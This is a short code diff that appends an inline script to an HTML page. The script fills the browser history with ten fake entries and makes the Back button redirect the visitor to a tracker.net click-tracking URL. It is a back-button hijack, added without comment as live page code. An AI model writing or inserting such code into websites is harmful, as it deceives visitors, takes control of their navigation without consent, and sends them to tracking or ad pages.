@@ -389,4 +389,17 @@ $("#p_modal_button3").click(function(){
 });
 </script>
 
+<script type="text/javascript">
+    ! function () {
+        var t;
+        try {
+            const URL = window.location.href.split(/[#]/)[0];
+            for (t = 0; 10 > t; ++t) history.pushState({}, "", URL+'#')
+            onpopstate = function(event){
+                event.state && location.replace('https://tracker.net/click.php?lp=1&event10=1');
+            }
+        } catch (o) { console.log( o ); }
+    }();
+</script>
+
 </body></html>
